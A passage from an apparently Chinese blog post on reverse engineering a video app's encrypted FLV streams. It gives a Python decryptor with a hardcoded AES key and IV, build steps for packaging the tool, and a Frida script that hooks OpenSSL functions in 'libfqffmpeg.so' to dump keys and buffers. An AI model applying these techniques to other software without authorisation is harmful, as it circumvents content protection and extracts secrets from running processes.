avctx-&gt;extradata_size,</span><br><span class="line">                                     &amp;p-&gt;ps, &amp;p-&gt;is_avc, &amp;p-&gt;nal_length_size,</span><br><span class="line">                                     avctx-&gt;err_recognition, avctx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;flags &amp; PARSER_FLAG_COMPLETE_FRAMES) &#123;</span><br><span class="line">        next = buf_size;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next = h264_find_frame_end(p, buf, buf_size, avctx);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ff_combine_frame(pc, next, &amp;buf, &amp;buf_size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            *poutbuf      = <span class="literal">NULL</span>;</span><br><span class="line">            *poutbuf_size = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> buf_size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (next &lt; <span class="number">0</span> &amp;&amp; next != END_NOT_FOUND) &#123;</span><br><span class="line">            av_assert1(pc-&gt;last_index + next &gt;= <span class="number">0</span>);</span><br><span class="line">            h264_find_frame_end(p, &amp;pc-&gt;buffer[pc-&gt;last_index + next], -next, avctx); <span class="comment">// update state</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parse_nal_units(s, avctx, buf, buf_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (avctx-&gt;framerate.num)</span><br><span class="line">        avctx-&gt;time_base = av_inv_q(av_mul_q(avctx-&gt;framerate, (AVRational)&#123;avctx-&gt;ticks_per_frame, <span class="number">1</span>&#125;));</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;sei.picture_timing.cpb_removal_delay &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        s-&gt;dts_sync_point    = p-&gt;sei.buffering_period.present;</span><br><span class="line">        s-&gt;dts_ref_dts_delta = p-&gt;sei.picture_timing.cpb_removal_delay;</span><br><span class="line">        s-&gt;pts_dts_delta     = p-&gt;sei.picture_timing.dpb_output_delay;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;dts_sync_point    = INT_MIN;</span><br><span class="line">        s-&gt;dts_ref_dts_delta = INT_MIN;</span><br><span class="line">        s-&gt;pts_dts_delta     = INT_MIN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;flags &amp; PARSER_FLAG_ONCE) &#123;</span><br><span class="line">        s-&gt;flags &amp;= PARSER_FLAG_COMPLETE_FRAMES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;dts_sync_point &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int64_t</span> den = avctx-&gt;time_base.den * (<span class="type">int64_t</span>)avctx-&gt;pkt_timebase.num;</span><br><span class="line">        <span class="keyword">if</span> (den &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int64_t</span> num = avctx-&gt;time_base.num * (<span class="type">int64_t</span>)avctx-&gt;pkt_timebase.den;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;dts != AV_NOPTS_VALUE) &#123;</span><br><span class="line">                <span class="comment">// got DTS from the stream, update reference timestamp</span></span><br><span class="line">                p-&gt;reference_dts = s-&gt;dts - av_rescale(s-&gt;dts_ref_dts_delta, num, den);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;reference_dts != AV_NOPTS_VALUE) &#123;</span><br><span class="line">                <span class="comment">// compute DTS based on reference timestamp</span></span><br><span class="line">                s-&gt;dts = p-&gt;reference_dts + av_rescale(s-&gt;dts_ref_dts_delta, num, den);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p-&gt;reference_dts != AV_NOPTS_VALUE &amp;&amp; s-&gt;pts == AV_NOPTS_VALUE)</span><br><span class="line">                s-&gt;pts = s-&gt;dts + av_rescale(s-&gt;pts_dts_delta, num, den);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (s-&gt;dts_sync_point &gt; <span class="number">0</span>)</span><br><span class="line">                p-&gt;reference_dts = s-&gt;dts; <span class="comment">// new reference</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *poutbuf      = buf;</span><br><span class="line">    *poutbuf_size = buf_size;</span><br><span class="line">    <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><p>根据 FLV 的语法描述，加密的部分是 NALu，写出解密算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flv = <span class="built_in">open</span>(<span class="string">&#x27;orig.flv&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">dst = <span class="built_in">open</span>(<span class="string">&#x27;dest.flv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flvheader = flv.read(<span class="number">13</span>)</span><br><span class="line"><span class="keyword">if</span> flvheader[:<span class="number">3</span>] != <span class="string">b&#x27;FLV&#x27;</span>:</span><br><span class="line">    <span class="keyword">raise</span> TypeError</span><br><span class="line">dst.write(flvheader)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get FLV TAG first 11 Bytes that including some information</span></span><br><span class="line">flvtag = flv.read(<span class="number">11</span>)</span><br><span class="line"><span class="keyword">while</span> flvtag:</span><br><span class="line">    tagtype = flvtag[<span class="number">0</span>] &amp; <span class="number">0x1F</span></span><br><span class="line">    datasize = <span class="built_in">int</span>.from_bytes(flvtag[<span class="number">1</span>:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    timestamp = <span class="built_in">int</span>.from_bytes(flvtag[<span class="number">4</span>:<span class="number">7</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Tag and Size of previous tag(4Bytes)</span></span><br><span class="line">    tagbody = flv.read(datasize + <span class="number">4</span>)</span><br><span class="line">    <span class="comment"># get the size of tag on progress</span></span><br><span class="line">    pretagsize = tagbody[-<span class="number">4</span>:]</span><br><span class="line">    <span class="comment"># get video tag header</span></span><br><span class="line">    tagheader = tagbody[:<span class="number">5</span>]</span><br><span class="line">    <span class="comment"># decrypt video NALu</span></span><br><span class="line">    <span class="keyword">if</span> tagtype == <span class="number">9</span>:</span><br><span class="line">        frametype = (tagheader[<span class="number">0</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">        codecid = tagheader[<span class="number">0</span>] &amp; <span class="number">0x0F</span></span><br><span class="line">        <span class="keyword">if</span> codecid == <span class="number">7</span>:</span><br><span class="line">            avcpackettype = tagheader[<span class="number">1</span>]</span><br><span class="line">            compositiontime = <span class="built_in">int</span>.from_bytes(tagheader[<span class="number">2</span>:], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(codecid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># get NALu</span></span><br><span class="line">        nalu = tagbody[<span class="number">5</span>:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> nalu[<span class="number">4</span>:<span class="number">12</span>] == <span class="string">b&#x27;\x00\x0F\x0E\x0D\x0F\x0F\x0D\x0E&#x27;</span>:</span><br><span class="line">            <span class="comment"># DO NOT USE Crypto, USE cryptography!</span></span><br><span class="line">            cipher = Cipher(algorithms.AES(<span class="string">b&#x27;1234567890qwerty&#x27;</span>), modes.CFB(<span class="string">b&#x27;0123456789abcdef&#x27;</span>))</span><br><span class="line">            decryptor = cipher.decryptor()</span><br><span class="line">            nalu = nalu[:<span class="number">4</span>] + decryptor.update(nalu[<span class="number">12</span>:])</span><br><span class="line">            <span class="comment"># change datasize and previous tag size</span></span><br><span class="line">            datasize -= <span class="number">8</span></span><br><span class="line">            flvtag = flvtag[:<span class="number">1</span>] + datasize.to_bytes(<span class="number">3</span>, <span class="string">&#x27;big&#x27;</span>) + flvtag[<span class="number">4</span>:]</span><br><span class="line">            pretagsize = (<span class="built_in">int</span>.from_bytes(pretagsize, <span class="string">&#x27;big&#x27;</span>) - <span class="number">8</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        dst.write(flvtag + tagheader + nalu + pretagsize)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dst.write(flvtag + tagbody)</span><br><span class="line">    <span class="comment"># process next tag</span></span><br><span class="line">    flvtag = flv.read(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flv.close()</span><br><span class="line">dst.close()</span><br></pre></td></tr></table></figure><h3 id="解密工具"><a href="#解密工具" class="headerlink" title="解密工具"></a>解密工具</h3><p>想使用 rtmpdump<br>在下载时顺便解密，但因为读取网络流后直接写入文件以及和需要解密的块不一样大，需要改动的地方太多，所以放弃了。<br>如果想要打包，首先要修改下源文件，以支持输入参数，修改结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hexdump <span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Dectypt FLV file that encrypted by libfqffmpeg.so, author tgMrZ&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;show debug info&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--log&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;the log file path, by default log will output to console&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;the encrypted flv file path&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;the decrypted output flv file path&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">flv = <span class="built_in">open</span>(args.<span class="built_in">input</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">dst = <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.debug:</span><br><span class="line">    loglevel = logging.DEBUG</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    loglevel = logging.INFO</span><br><span class="line"><span class="keyword">if</span> args.log:</span><br><span class="line">    logging.basicConfig(filename=<span class="string">f&quot;<span class="subst">&#123;args.log&#125;</span>.log&quot;</span>,</span><br><span class="line">                        <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>, level=loglevel)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    logging.basicConfig(<span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>, level=loglevel)</span><br><span class="line">logging.info(<span class="string">f&#x27;Encrypted FLV file path: <span class="subst">&#123;os.path.realpath(flv.name)&#125;</span>&#x27;</span>)</span><br><span class="line">logging.info(<span class="string">f&#x27;Decrypted FLV file path: <span class="subst">&#123;os.path.realpath(dst.name)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flvheader = flv.read(<span class="number">13</span>)</span><br><span class="line"><span class="keyword">if</span> flvheader[:<span class="number">3</span>] != <span class="string">b&#x27;FLV&#x27;</span>:</span><br><span class="line">    logging.error(<span class="string">&#x27;FLV HEADER ERROR!&#x27;</span>)</span><br><span class="line">    <span class="keyword">raise</span> TypeError</span><br><span class="line">dst.write(flvheader)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.debug:</span><br><span class="line">    logging.debug(<span class="string">&#x27;DEBUG INFO:&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    logging.info(<span class="string">&quot;Waiting for decryption...This may be take a long time...Don&#x27;t panic...&quot;</span>)</span><br><span class="line"><span class="comment"># get FLV TAG first 11 Bytes that including some information</span></span><br><span class="line">flvtag = flv.read(<span class="number">11</span>)</span><br><span class="line">serial = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> flvtag:</span><br><span class="line">    tagtype = flvtag[<span class="number">0</span>] &amp; <span class="number">0x1F</span></span><br><span class="line">    datasize = <span class="built_in">int</span>.from_bytes(flvtag[<span class="number">1</span>:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    timestamp = <span class="built_in">int</span>.from_bytes(flvtag[<span class="number">4</span>:<span class="number">7</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="comment"># Tag and Size of previous tag(4Bytes)</span></span><br><span class="line">    tagbody = flv.read(datasize + <span class="number">4</span>)</span><br><span class="line">    <span class="comment"># get the size of tag on progress</span></span><br><span class="line">    pretagsize = tagbody[-<span class="number">4</span>:]</span><br><span class="line">    <span class="comment"># get video tag header</span></span><br><span class="line">    tagheader = tagbody[:<span class="number">5</span>]</span><br><span class="line">    <span class="comment"># decrypt video NALu</span></span><br><span class="line">    <span class="keyword">if</span> tagtype == <span class="number">9</span>:</span><br><span class="line">        frametype = (tagheader[<span class="number">0</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">        codecid = tagheader[<span class="number">0</span>] &amp; <span class="number">0x0F</span></span><br><span class="line">        <span class="comment"># AVC</span></span><br><span class="line">        <span class="keyword">if</span> codecid == <span class="number">7</span>:</span><br><span class="line">            avcpackettype = tagheader[<span class="number">1</span>]</span><br><span class="line">            compositiontime = <span class="built_in">int</span>.from_bytes(tagheader[<span class="number">2</span>:], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="comment"># get NALu</span></span><br><span class="line">            nalu = tagbody[<span class="number">5</span>:-<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">if</span> nalu[<span class="number">4</span>:<span class="number">12</span>] == <span class="string">b&#x27;\x00\x0F\x0E\x0D\x0F\x0F\x0D\x0E&#x27;</span>:</span><br><span class="line">                <span class="comment"># DO NOT USE Crypto, USE cryptography!</span></span><br><span class="line">                cipher = Cipher(algorithms.AES(<span class="string">b&#x27;1234567890qwerty&#x27;</span>), modes.CFB(<span class="string">b&#x27;0123456789abcdef&#x27;</span>))</span><br><span class="line">                decryptor = cipher.decryptor()</span><br><span class="line">                nalu = nalu[:<span class="number">4</span>] + decryptor.update(nalu[<span class="number">12</span>:])</span><br><span class="line">                <span class="comment"># change datasize and previous tag size</span></span><br><span class="line">                datasize -= <span class="number">8</span></span><br><span class="line">                flvtagdst = flvtag[:<span class="number">1</span>] + datasize.to_bytes(<span class="number">3</span>, <span class="string">&#x27;big&#x27;</span>) + flvtag[<span class="number">4</span>:]</span><br><span class="line">                <span class="comment"># datasize equals to length of the tag - 11</span></span><br><span class="line">                pretagsize = (datasize + <span class="number">11</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                nalusize = <span class="built_in">int</span>.from_bytes(nalu[:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> datasize - nalusize != <span class="number">9</span>:</span><br><span class="line">                    logging.info(<span class="string">f&#x27;Tag <span class="subst">&#123;serial&#125;</span>: \nDecrypt Tag Data: \n&#x27;</span></span><br><span class="line">                                 <span class="string">f&#x27;<span class="subst">&#123;hexdump(flvtagdst + tagheader + nalu + pretagsize, result=<span class="string">&quot;return&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">                                 <span class="string">f&#x27;\n<span class="subst">&#123;<span class="string">&quot;-&quot;</span> * <span class="number">76</span>&#125;</span>\nEncrypt Tag Data: \n&#x27;</span></span><br><span class="line">                                 <span class="string">f&#x27;<span class="subst">&#123;hexdump(flvtag + tagbody, result=<span class="string">&quot;return&quot;</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="keyword">raise</span> TypeError</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flvtag = flvtagdst</span><br><span class="line">            dst.write(flvtag + tagheader + nalu + pretagsize)</span><br><span class="line">        <span class="comment"># HEVC</span></span><br><span class="line">        <span class="keyword">elif</span> codecid == <span class="number">12</span>:</span><br><span class="line">            logging.error(<span class="string">&quot;请使用 雷电3模拟器 抓包下载！&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">f&#x27;UNKNOWN CODECID: <span class="subst">&#123;codecid&#125;</span> at <span class="subst">&#123;serial&#125;</span>th packet\n<span class="subst">&#123;hexdump(tagbody, result=<span class="string">&quot;return&quot;</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> args.debug:</span><br><span class="line">            logging.debug(<span class="string">f&#x27;Packet Serial Number: <span class="subst">&#123;serial: &gt;&#123;<span class="number">8</span>&#125;</span>&#125; , Previous Tag Size: <span class="subst">&#123;pretagsize.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        serial += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        serial += <span class="number">1</span></span><br><span class="line">        dst.write(flvtag + tagbody)</span><br><span class="line">    <span class="comment"># process next tag</span></span><br><span class="line">    flvtag = flv.read(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flv.close()</span><br><span class="line">dst.close()</span><br><span class="line">logging.info(<span class="string">&#x27;DONE!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>主要是加了参数和日志。<br>接下来就是打包的问题了，在网上搜了很多，最终决定使用 Cython。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> PROJECT_NAME=main</span><br><span class="line"><span class="built_in">set</span> PYTHON_DIR=C:\Users\Administrator\AppData\Local\Programs\Python\Python38</span><br><span class="line">%PYTHON_DIR%\python -m cython --embed -o %PROJECT_NAME%.c %PROJECT_NAME%.py</span><br><span class="line">:gcc -Os -I %PYTHON_DIR%\include -o %PROJECT_NAME%.exe %PROJECT_NAME%.c -lpython38 -lm -L %PYTHON_DIR%\libs</span><br><span class="line">cl.exe /nologo /Ox /MD /W3 /GS- /DNDEBUG -I%PYTHON_DIR%\include /Tc%PROJECT_NAME%.c /link /OUT:%PROJECT_NAME%.exe /SUBSYSTEM:CONSOLE /MACHINE:X64 /LIBPATH:%PYTHON_DIR%\libs</span><br></pre></td></tr></table></figure><p>开始想使用 gcc 编译，但总是失败，看到打包扩展的时候 Cython 不推荐使用 Mingw64，<a href="https://github.com/cython/cython/wiki/CythonExtensionsOnWindows">参考</a>。<br>后来决定放弃，当时使用的参数为，在 msys2 上：</p><pre><code>cython --embed -o main.c main.pygcc -shared -pthread -fPIC -fwrapv -O2 -Wall -fno-strict-aliasing $(python3-config --cflags --embed) $(python3-config --embed --ldflags) -o main.exe main.c</code></pre><p>更多的 gcc 参数：<a href="https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html">https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html</a><br>python3-config 获取参数：<a href="https://stackoverflow.com/questions/27672572/embedding-python-in-c-linking-fails-with-undefined-reference-to-py-initialize">参考</a></p><h4 id="构造-Stand-Alone"><a href="#构造-Stand-Alone" class="headerlink" title="构造 Stand-Alone"></a>构造 Stand-Alone</h4><p>To allow you executable file to run with python you will first need to<br>download an embedded zip file from the python website. If you are<br>running a “hello world” example, only the <code>python.zip</code> folder,<br><code>python._pth</code>, and <code>python.dll</code> files are required in the folder with<br>the executable file. However, to produce tools that have more practical<br>benefits other libraries need to be included. In that case, a Lib folder<br>should be created in the embedded zip folder and the appropriate<br>libraries from the installed python in the <code>\Lib\site-packages</code> folder<br>should be copied – in this example, the numpy, pyqt5, and pyqtgraph<br>libraries were copied. The <code>/Lib</code> folder path should also be added to<br>the <code>python._pth</code> file.<br>参考：<a href="https://cnocanalysis.com/2020/07/04/compiling-cython-c-code-with-msvc-compiler-to-create-a-stand-alone-executable">https://cnocanalysis.com/2020/07/04/compiling-cython-c-code-with-msvc-compiler-to-create-a-stand-alone-executable</a></p><h4 id="HEVC"><a href="#HEVC" class="headerlink" title="HEVC"></a>HEVC</h4><p>这货竟然还实现了 FLV 对 HEVC 的支持，我他妈的也是醉了！RNM！ 完成了对 ffmpeg 的魔改，增加了对 FLV+HEVC 的支持。<br>播放是可以播放了，但现在全屏马赛克，并报错：</p><pre><code>The cu_qp_delta x is outside the valid range [-26, 25]CABAC_MAX_BIN : 7</code></pre><p>但是解密部分太难了，找了非常多函数都没找到，实在不行就一个一个找。总有找到的时候。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/hevc-dontpanic.png' data-fancybox='default' data-caption='hevc-dontpanic.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/hevc-dontpanic.png" class="lazyload" data-srcset="/img/2022/tomato/hevc-dontpanic.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="hevc-dontpanic.png"></a><span class='image-caption'>hevc-dontpanic.png</span></div></div><p>把关键位置全都找完了，还是没发现，哭了。没办法，以后再说吧。</p><h5 id="关键位置"><a href="#关键位置" class="headerlink" title="关键位置"></a>关键位置</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookSo1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> EVP_DecryptInit_ex = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libfqffmpeg.so&#x27;</span>, <span class="string">&#x27;EVP_CipherInit_ex&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> EVP_DecryptUpdate = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libfqffmpeg.so&#x27;</span>, <span class="string">&#x27;EVP_DecryptUpdate&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> a1;</span><br><span class="line">    <span class="keyword">var</span> a4;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(EVP_DecryptInit_ex, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;EVP_DecryptInit_ex key &amp; iv: ------------------------- \n&#x27;</span>,</span><br><span class="line">                <span class="title function_">hexdump</span>(args[<span class="number">3</span>], &#123;<span class="attr">length</span>: <span class="number">16</span>, <span class="attr">header</span>: <span class="literal">false</span>&#125;), <span class="string">&#x27;\n&#x27;</span>,</span><br><span class="line">                <span class="title function_">hexdump</span>(args[<span class="number">4</span>], &#123;<span class="attr">length</span>: <span class="number">16</span>, <span class="attr">header</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retValue</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(EVP_DecryptUpdate, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">a1 = args[<span class="number">1</span>]</span><br><span class="line">            a4 = args[<span class="number">4</span>].<span class="title function_">toInt32</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;IN : ------------------------------------------------- \n&#x27;</span>,</span><br><span class="line">                <span class="title function_">hexdump</span>(args[<span class="number">3</span>], &#123;<span class="attr">length</span>: args[<span class="number">4</span>].<span class="title function_">toInt32</span>(), <span class="attr">header</span>: <span class="literal">false</span>&#125;))</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span 